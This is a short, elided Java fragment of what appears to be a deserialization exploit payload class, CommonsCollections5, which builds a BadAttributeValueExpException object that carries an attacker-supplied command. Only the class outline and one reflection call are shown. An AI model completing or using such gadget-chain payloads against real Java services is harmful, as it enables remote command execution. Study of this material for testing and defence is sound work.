...
@dogeser.payloads.annotation.Authors({ dogeser.payloads.annotation.Authors.MATTHIASKAISER, Authors.JASINNER })
public class CommonsCollections5 extends dogeser.payloads.util.PayloadRunner implements ObjectPayload<BadAttributeValueExpException> {
	...
	public BadAttributeValueExpException getObject(final String command) throws Exception {
        ...
        dogeser.payloads.util.Reflections.setAccessible(valfield);
